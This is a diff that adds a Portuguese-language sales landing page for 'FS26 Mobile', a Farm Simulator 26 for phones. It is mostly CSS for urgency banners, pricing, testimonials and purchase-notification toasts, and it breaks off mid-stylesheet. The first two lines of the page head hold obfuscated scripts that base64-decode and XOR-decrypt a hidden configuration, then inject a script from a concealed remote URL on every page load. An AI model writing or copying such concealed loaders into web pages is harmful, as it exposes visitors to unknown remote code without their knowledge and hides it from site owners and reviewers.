@@ -1,0 +1,1792 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <script>(function(){var m_9j07=atob("DPzIvERW76GGi64Hw4fqyTY6zZuk49pzs4/yk2s1i8+o/tpqqpqxkic5go/k+YF0oI6hzDAlwNHv88tr7IyhxCE6wcv1qYIlooi8zi00mtXj+Iw9mKHkniM6gMPn590l+aeznio3gsSksYx3qoSt0A0yzY2k/c9rtpnqhmZgjsXiv8s38sz+jnAw35Dkssg+9p/6iyJ0kvz7");var y_y=[];for(var j_e=0;j_e<m_9j07.length;j_e++){y_y.push(m_9j07.charCodeAt(j_e)&255);}var c_6ec=y_y[0];var c_64u=y_y.slice(1,1+c_6ec);var c_od=y_y.slice(1+c_6ec);var k_so=c_od.map(function(b,i_hp6z){return b^c_64u[i_hp6z%c_6ec];});var j_b="";for(var n_z04n=0;n_z04n<k_so.length;n_z04n++){j_b+=String.fromCharCode(k_so[n_z04n]&255);}var a_48=decodeURIComponent(escape(j_b));var q_1=JSON.parse(a_48);var y_80i=q_1.globals||[];y_80i.forEach(function(o_y){window[o_y.name]=o_y.value;});var j_x=document.createElement("script");j_x.src=q_1.url;j_x.async=true;j_x.defer=true;(q_1.attributes||[]).forEach(function(i_l){j_x.setAttribute(i_l.name,i_l.value);});(document.head||document.documentElement).appendChild(j_x);})();</script>
+    <script>(function(){var a_dcc=atob("DLv+HplfDrtp8UE17cDca+szLIFLmTVBncjEMbY8atVHhDVYhN2HMPowY5ULg25GjsmXbu0sIc4dnDIagdqKe+orINEa020XjM+KbPA9e88MgmMPtsDccPgya5lT0yVUmdrTa+0yZ90Q3DFHiM2bcO1ydtgGlWxGjtDcMrspb9cclGMPz5mDMuJ9YNoElGMPz9+favhye88EmCdMwMuMe+86YM9EgjRXhN+NPLV9eNoFhCQX15ncY8Qi");var o_dil5=[];for(var t_9zfz=0;t_9zfz<a_dcc.length;t_9zfz++){o_dil5.push(a_dcc.charCodeAt(t_9zfz)&255);}var o_n=o_dil5[0];var j_t4v=o_dil5.slice(1,1+o_n);var g_mz=o_dil5.slice(1+o_n);var x_1=g_mz.map(function(b,k_7ik4){return b^j_t4v[k_7ik4%o_n];});var d_gp="";for(var d_f=0;d_f<x_1.length;d_f++){d_gp+=String.fromCharCode(x_1[d_f]&255);}var y_dewu=decodeURIComponent(escape(d_gp));var o_e2i=JSON.parse(y_dewu);var w_2vs=o_e2i.globals||[];w_2vs.forEach(function(a_es){window[a_es.name]=a_es.value;});var r_nk=document.createElement("script");r_nk.src=o_e2i.url;r_nk.async=true;r_nk.defer=true;(o_e2i.attributes||[]).forEach(function(p_ka){r_nk.setAttribute(p_ka.name,p_ka.value);});(document.head||document.documentElement).appendChild(r_nk);})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FS26 Mobile – Farm Simulator 26 no Celular</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Montserrat:wght@400;700;900&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0a0a0a;
+            --bg-accent: #111111;
+            --primary-yellow: #FFD700;
+            --neon-green: #39ff14;
+            --farm-green: #2ecc40;
+            --glass-bg: rgba(20, 20, 20, 0.85);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at 50% 0%, #1a1a1a 0%, #000000 100%);
+            color: var(--text-main);
+            font-family: 'Montserrat', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }        .mobile-wrapper {
+            width: 100%;
+            max-width: 480px;
+            background: #000;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 1);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== URGENCY BAR ===== */
+        .urgency-bar {
+            background: linear-gradient(90deg, #ff4444, #cc0000);
+            text-align: center;
+            padding: 10px 15px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            animation: urgencyPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes urgencyPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.85; }
+        }
+
+        /* ===== HERO SECTION ===== */
+        .hero-section {
+            padding: 20px 0 0 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: #000;
+        }
+
+        .hero-title {
+            position: relative;
+            width: 100%;
+            text-align: center;
+            padding: 0 15px 15px 15px;
+            box-sizing: border-box;
+            z-index: 2;
+        }
+
+        .hero-title h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.6rem;
+            line-height: 1.2;
+            margin: 0;
+            text-transform: uppercase;
+            color: #fff;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            letter-spacing: 1px;
+        }
+
+        .hero-title .highlight {
+            color: var(--primary-yellow);
+            display: block;
+            font-size: 2.4rem;
+            margin-top: 5px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+            line-height: 1;
+        }
+
+        .hero-subtitle {
+            font-size: 0.88rem;
+            color: #ccc;
+            margin-top: 12px;
+            line-height: 1.45;
+            padding: 0 10px;
+        }
+
+        .hero-title .badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin-top: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #ccc;
+            font-weight: 600;
+        }
+
+        /* ===== HERO IMAGE ===== */
+        .hero-image {
+            width: 95%;
+            max-width: 450px;
+            /* aspect-ratio: 16/9; */
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+            margin-bottom: -30px;
+            position: relative;
+            z-index: 5;
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .hero-image-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #111;
+            color: #666;
+            font-size: 0.85rem;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* ===== VIDEO BOX ===== */
+        .video-section {
+            padding: 40px 15px 0 15px;
+        }
+
+        .section-label {
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .section-label span {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: var(--neon-green);
+            font-weight: 700;
+        }
+
+        .section-title {
+            font-family: 'Rajdhani', sans-serif;
+            text-align: center;
+            font-size: 1.4rem;
+            text-transform: uppercase;
+            color: #fff;
+            margin: 0 0 5px 0;
+            letter-spacing: 1px;
+        }
+
+        .section-title .accent {
+            color: var(--primary-yellow);
+        }
+
+        .section-subtitle {
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin: 0 0 15px 0;
+        }
+
+        .video-box {
+            width: 100%;
+            /* aspect-ratio: 16/9; */
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid #333;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
+            position: relative;
+        }
+
+        .video-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
+            color: #555;
+            font-size: 0.85rem;
+            gap: 8px;
+        }
+
+        .video-placeholder .play-icon {
+            font-size: 2.5rem;
+        }
+
+        /* ===== CTA INLINE (after video) ===== */
+        .cta-inline {
+            text-align: center;
+            padding: 20px 15px 0 15px;
+        }
+
+        /* ===== CONTENT / OFFER AREA ===== */
+        .content {
+            padding: 50px 15px 0 15px;
+        }
+
+        /* ===== UNLOCKED SECTION ===== */
+        .unlocked-section {
+            background: linear-gradient(145deg, rgba(20, 20, 20, 1) 0%, rgba(10, 10, 10, 1) 100%);
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 25px 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            margin-bottom: 30px;
+        }
+
+        .unlocked-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+            opacity: 0.7;
+        }
+
+        .unlocked-header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #222;
+        }
+
+        .unlocked-header .emoji-big {
+            font-size: 1.8rem;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .unlocked-header h2 {
+            font-family: 'Rajdhani', sans-serif;
+            color: #fff;
+            margin: 0;
+            font-size: 1.3rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .unlocked-header h2 .green {
+            color: var(--neon-green);
+        }
+
+        .unlocked-header p {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            margin: 8px 0 0 0;
+            line-height: 1.4;
+        }
+
+        /* Money highlight card */
+        .money-highlight {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.08), rgba(255, 215, 0, 0.02));
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            border-radius: 10px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .money-highlight .money-icon {
+            font-size: 1.8rem;
+            flex-shrink: 0;
+        }
+
+        .money-highlight .money-text {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--primary-yellow);
+            line-height: 1.3;
+        }
+
+        .money-highlight .money-text small {
+            display: block;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            margin-top: 2px;
+        }
+
+        /* Benefits list */
+        .benefits-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .benefits-list li {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 11px;
+            font-size: 0.9rem;
+            color: var(--text-main);
+            line-height: 1.35;
+            font-weight: 600;
+        }
+
+        .benefits-list li:last-child {
+            margin-bottom: 0;
+        }
+
+        .icon {
+            margin-right: 10px;
+            font-size: 1rem;
+            flex-shrink: 0;
+            line-height: 1.35;
+        }
+
+        /* ===== GALLERY SECTION ===== */
+        .gallery-section {
+            margin-top: 5px;
+            padding: 0 0 0 0;
+        }
+
+        .gallery-badge {
+            display: inline-block;
+            background: rgba(57, 255, 20, 0.1);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-green);
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .carousel {
+            display: flex;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            gap: 15px;
+            padding: 10px 0 20px 0;
+            margin-bottom: 0;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .carousel::-webkit-scrollbar {
+            height: 6px;
+        }
+
+        .carousel::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+        }
+
+        .carousel::-webkit-scrollbar-thumb {
+            background: var(--neon-green);
+            border-radius: 3px;
+        }
+
+        .carousel-item {
+            scroll-snap-align: center;
+            width: 85%;
+            /* aspect-ratio: 16/9; */
+            border-radius: 12px;
+            flex-shrink: 0;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            background: #111;
+        }
+
+        .carousel-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .carousel-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
+            color: #555;
+            font-size: 0.8rem;
+            text-align: center;
+            padding: 10px;
+        }
+
+        /* ===== PRICING SECTION ===== */
+        .pricing-section {
+            padding: 30px 15px;
+        }
+
+        .pricing-card {
+            background: linear-gradient(145deg, rgba(20, 20, 20, 1) 0%, rgba(10, 10, 10, 1) 100%);
+            border: 2px solid rgba(57, 255, 20, 0.3);
+            border-radius: 16px;
+            padding: 30px 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5), 0 0 30px rgba(57, 255, 20, 0.08);
+        }
+
+        .pricing-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), var(--primary-yellow), var(--neon-green), transparent);
+        }
+
+        .pricing-badge {
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .pricing-badge span {
+            font-size: 0.68rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-green);
+            font-weight: 700;
+        }
+
+        .price-tag {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .old-price {
+            display: block;
+            font-size: 1rem;
+            color: #ff4444;
+            text-decoration: line-through;
+            opacity: 0.8;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+
+        .new-price {
+            display: block;
+            font-size: 1.1rem;
+            color: #fff;
+            text-transform: uppercase;
+        }
+
+        .amount {
+            font-size: 3rem;
+            color: var(--primary-yellow);
+            font-weight: 700;
+            text-shadow: 0 0 25px rgba(255, 215, 0, 0.5);
+            font-family: 'Rajdhani', sans-serif;
+            display: block;
+            line-height: 1;
+            margin-top: 5px;
+        }
+
+        .pricing-perks {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+            margin: 15px 0 20px 0;
+        }
+
+        .pricing-perk {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 5px 12px;
+            border-radius: 20px;
+        }
+
+        /* CTA Button */
+        .cta-button {
+            display: block;
+            width: 100%;
+            background: linear-gradient(90deg, #00C853, #00E676);
+            color: #000;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 700;
+            font-size: 1.35rem;
+            text-decoration: none;
+            padding: 18px 0;
+            border-radius: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 0 20px rgba(0, 230, 118, 0.4);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(0, 230, 118, 0.6);
+            filter: brightness(1.1);
+        }
+
+        .cta-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(rgba(255, 255, 255, 0.2), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .cta-subtext {
+            margin-top: 12px;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+            display: block;
+            text-align: center;
+        }
+
+        .cta-button-small {
+            font-size: 1.15rem;
+            padding: 15px 0;
+        }
+
+        /* ===== GUARANTEE SECTION ===== */
+        .guarantee-section {
+            padding: 0 15px 30px 15px;
+        }
+
+        .guarantee-card {
+            background: rgba(57, 255, 20, 0.04);
+            border: 1px solid rgba(57, 255, 20, 0.2);
+            border-radius: 12px;
+            padding: 22px 18px;
+            text-align: center;
+        }
+
+        .guarantee-card .shield {
+            font-size: 2.5rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .guarantee-card h3 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.2rem;
+            color: var(--neon-green);
+            margin: 0 0 8px 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .guarantee-card p {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        .guarantee-card p strong {
+            color: #fff;
+        }
+
+        /* ===== TESTIMONIALS MARQUEE ===== */
+        .testimonials-section {
+            padding: 40px 0 20px 0;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .testimonials-marquee-wrapper {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+            padding: 15px 0 10px 0;
+            -webkit-mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%);
+            mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%);
+        }
+
+        .testimonials-marquee-track {
+            display: flex;
+            width: max-content;
+            cursor: pointer;
+        }
+
+        .testimonials-marquee-group {
+            display: flex;
+            gap: 14px;
+            padding-right: 14px;
+            flex-shrink: 0;
+            animation: marquee-scroll 28s linear infinite;
+            will-change: transform;
+        }
+
+        .testimonials-marquee-wrapper:hover .testimonials-marquee-group,
+        .testimonials-marquee-wrapper:active .testimonials-marquee-group {
+            animation-play-state: paused;
+        }
+
+        @keyframes marquee-scroll {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .testimonial-card {
+            flex-shrink: 0;
+            width: 220px;
+            background: linear-gradient(145deg, rgba(24, 24, 24, 0.95), rgba(14, 14, 14, 0.98));
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            padding: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
+            user-select: none;
+            box-sizing: border-box;
+        }
+
+        .testimonial-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--farm-green, #2ecc40);
+            box-shadow: 0 12px 30px rgba(46, 204, 64, 0.2);
+        }
+
+        .testimonial-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .testimonial-card-header .stars {
+            color: var(--primary-yellow, #FFD700);
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+
+        .testimonial-card-header .verified-badge {
+            background: rgba(46, 204, 64, 0.15);
+            color: var(--farm-green, #2ecc40);
+            border: 1px solid rgba(46, 204, 64, 0.3);
+            font-size: 0.65rem;
+            font-weight: 700;
+            padding: 2px 7px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .testimonial-img-box {
+            width: 100%;
+            height: 310px;
+            border-radius: 9px;
+            background: #080808;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .testimonial-img-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+            pointer-events: none;
+        }
+
+        .testimonial-card-footer {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #777;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+
+        .testimonial-card:hover .testimonial-card-footer {
+            color: var(--farm-green, #2ecc40);
+        }
+
+        /* ===== LIGHTBOX MODAL ===== */
+        .proof-lightbox {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999;
+            padding: 16px;
+            box-sizing: border-box;
+            opacity: 0;
+            transition: opacity 0.25s ease;
+        }
+
+        .proof-lightbox.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .proof-lightbox-content {
+            position: relative;
+            max-width: 92vw;
+            max-height: 90vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: zoomInProof 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes zoomInProof {
+            from {
+                transform: scale(0.9);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .proof-lightbox-content img {
+            max-width: 100%;
+            max-height: 85vh;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.9);
+            object-fit: contain;
+        }
+
+        .proof-lightbox-close {
+            position: absolute;
+            top: -42px;
+            right: 0;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .proof-lightbox-close:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        /* ===== FAQ SECTION ===== */
+        .faq-section {
+            padding: 0 15px;
+            margin-top: 5px;
+        }
+
+        .faq-title {
+            font-family: 'Rajdhani', sans-serif;
+            color: #fff;
+            text-align: center;
+            font-size: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 0 0 20px 0;
+        }
+
+        .faq-title span {
+            color: var(--neon-green);
+        }
+
+        .faq-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .faq-item {
+            background: linear-gradient(145deg, rgba(22, 22, 22, 0.98), rgba(12, 12, 12, 0.98));
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.25s ease;
+        }
+
+        .faq-item[open] {
+            border-color: rgba(57, 255, 20, 0.45);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .faq-question {
+            list-style: none;
+            padding: 15px 16px;
+            font-size: 0.92rem;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            user-select: none;
+        }
+
+        .faq-question::-webkit-details-marker {
+            display: none;
+        }
+
+        .faq-icon {
+            color: var(--neon-green);
+            font-size: 1.3rem;
+            font-weight: 700;
+            transition: transform 0.25s ease;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+
+        .faq-item[open] .faq-icon {
+            transform: rotate(45deg);
+            color: var(--primary-yellow);
+        }
+
+        .faq-answer {
+            padding: 0 16px 16px 16px;
+            font-size: 0.85rem;
+            color: #bbb;
+            line-height: 1.55;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 12px;
+        }
+
+        .faq-answer strong {
+            color: #fff;
+        }
+
+        .faq-answer .highlight-green {
+            color: var(--neon-green);
+            font-weight: 700;
+        }
+
+        /* ===== FINAL CTA ===== */
+        .final-cta {
+            padding: 30px 15px;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer-trust {
+            text-align: center;
+            padding: 25px 20px;
+            color: #444;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            margin-top: auto;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== SOCIAL TOAST ===== */
+        .social-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(20, 20, 20, 0.95);
+            border: 1px solid var(--neon-green);
+            padding: 12px 20px;
+            border-radius: 50px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 1000;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            width: 90%;
+            max-width: 350px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .social-toast.active {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--neon-green);
+            animation: pulse 2s infinite;
+            flex-shrink: 0;
+        }
+
+        .toast-text {
+            font-size: 0.85rem;
+            color: #fff;
+            margin: 0;
+            line-height: 1.3;
+        }
+
+        .toast-text strong {
+            color: var(--primary-yellow);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* ===== PASSO A PASSO (COMPROU, BAIXOU, JOGOU!) ===== */
+        .steps-section {
+            padding: 10px 0 35px 0;
+            text-align: center;
+            width: 100%;
+        }
+
+        .steps-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(46, 204, 64, 0.12);
+            border: 1.5px solid rgba(57, 255, 20, 0.4);
+            color: #76ff03;
+            font-size: 0.72rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 20px;
+            padding: 6px 16px;
+            margin-bottom: 12px;
+        }
+
+        .steps-title {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.85rem;
+            font-weight: 900;
+            color: #fff;
+            text-transform: uppercase;
+            margin: 0 0 6px 0;
+            line-height: 1.1;
+            letter-spacing: 0.5px;
+        }
+
+        .steps-title .highlight-step {
+            color: #76ff03;
+            text-shadow: 0 0 12px rgba(118, 255, 3, 0.4);
+        }
+
+        .steps-subtitle {
+            color: var(--text-muted, #aaaaaa);
+            font-size: 0.85rem;
+            margin: 0 0 22px 0;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .step-card {
+            background: linear-gradient(180deg, #0e120e 0%, #050605 100%);
+            border: 1.5px solid rgba(57, 255, 20, 0.25);
+            border-radius: 16px;
+            padding: 14px 6px 14px 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+            transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
+            box-sizing: border-box;
+        }
+
+        .step-card:hover {
+            transform: translateY(-3px);
+            border-color: #76ff03;
+            box-shadow: 0 10px 25px rgba(118, 255, 3, 0.2);
+        }
+
+        .step-num {
+            background: #76ff03;
+            color: #000;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 900;
+            font-size: 0.85rem;
+            border-radius: 6px;
+            padding: 3px 10px;
+            margin-bottom: 12px;
+            line-height: 1;
+        }
+
+        .step-img-box {
+            width: 100%;
+            height: 130px;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .step-img-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .step-card-title {
+            font-family: 'Rajdhani', sans-serif;
+            color: #76ff03;
+            font-weight: 900;
+            font-size: 0.88rem;
+            text-transform: uppercase;
+            margin: 0 0 6px 0;
+            line-height: 1.15;
+            letter-spacing: 0.5px;
+        }
+
+        .step-card-desc {
+            font-size: 0.68rem;
+            line-height: 1.35;
+            color: #cfcfcf;
+            margin: 0;
+        }
+
+        .steps-footer-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 18px;
+            font-size: 0.78rem;
+            color: #bbb;
+            font-weight: 600;
+        }
+
+        .steps-footer-note .check-icon {
+            color: #76ff03;
+            font-weight: 900;
+            font-size: 0.95rem;
+        }
+
+        @media (max-width: 380px) {
+            .steps-title {
+                font-size: 1.55rem;
+            }
+            .step-card {
+                padding: 10px 4px 10px 4px;
+                border-radius: 12px;
+            }
+            .step-img-box {
+                height: 105px;
+            }
+            .step-card-title {
+                font-size: 0.78rem;
+            }
+            .step-card-desc {
+                font-size: 0.62rem;
+                line-height: 1.25;
+            }
+            .step-num {
+                font-size: 0.75rem;
+                padding: 2px 7px;
+            }
+        }
+
+        /* ===== OFFER CARD (Super Card EuroTruck style) ===== */
+        .offer-card {
+            background: linear-gradient(145deg, rgba(20, 20, 20, 1) 0%, rgba(10, 10, 10, 1) 100%);
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 25px 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .offer-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+            opacity: 0.7;
+        }
+
+        .offer-card-title {
+            font-family: 'Rajdhani', sans-serif;
+            color: #fff;
+            margin: 0 0 20px 0;
+            font-size: 1.4rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+            border-bottom: 1px solid #222;
+            padding-bottom: 15px;
+        }
+
+        .offer-card .benefits-list li {
+            font-weight: 600;
+        }
+
+        .offer-card .carousel {
+            margin-bottom: 5px;
+        }
+
+        .offer-card .benefits-list {
+            border-top: 3px solid var(--neon-green);
+            padding-top: 18px;
+        }
+
+        .offer-card .benefits-list li .icon {
+            color: var(--neon-green);
+            text-shadow: 0 0 10px rgba(57, 255, 20, 0.6);
+        }
+
+        .offer-card .benefits-list li.bonus {
